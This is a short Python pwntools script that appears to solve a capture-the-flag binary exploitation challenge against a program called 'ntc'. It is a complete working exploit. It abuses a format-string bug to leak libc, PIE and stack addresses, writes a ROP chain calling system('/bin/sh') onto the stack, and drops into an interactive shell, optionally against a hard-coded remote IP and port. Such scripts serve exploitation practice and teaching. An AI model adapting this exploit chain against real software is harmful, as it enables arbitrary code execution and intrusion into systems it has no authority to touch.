from pwn import *

libc = ELF('./libc.so.6',checksec=False)
elf = context.binary = ELF("./ntc")

r = ROP(elf)

sh = process("./ntc")

if args.REMOTE:
	sh = remote("20.199.76.210",1002)

sh.sendline(b"%91$p%73$p%75$p")
sh.recvuntil(b'le hash NTLM : ')

libc_leak = int(sh.recv(14),16)
main_leak = int(sh.recv(14),16)
stack_leak = int(sh.recv(14),16)

print('main leak  @ ',hex(main_leak))
print('libc leak  @ ',hex(libc_leak))
print('stack leak @ ',hex(stack_leak))

libc.address = libc_leak - (libc.sym['__libc_start_main']+133)
elf.address  = main_leak - elf.sym['main']
rsp = stack_leak - 1968

print('\n\nMAIN      @ ',hex(main_leak))
print('LIBC BASE @ ',hex(libc.address))
print('RSP       @ ',hex(rsp))
print('PIE       @ ',hex(elf.address))
print('/bin/sh   @ ',hex(next(libc.search(b'/bin/sh'))))
print('system    @ ',hex(libc.sym['system']))
print('pop rdi,  @ ',hex(elf.address + r.find_gadget(['pop rdi','ret'])[0]))
print('ret       @ ',hex(elf.address + r.find_gadget(['ret'])[0]))

payload_write = {
	rsp    : elf.address + r.find_gadget(['pop rdi','ret'])[0] ,
	rsp+8  : next(libc.search(b'/bin/sh')),
	rsp+16 : elf.address + r.find_gadget(['ret'])[0],
	rsp+24 : libc.sym['system']
}
sh.recv()
payload = fmtstr_payload(6,payload_write)

sh.sendline(payload)
sh.recvuntil(b"<html>\r\n\n")
sh.sendline(b"")
sh.interactive()
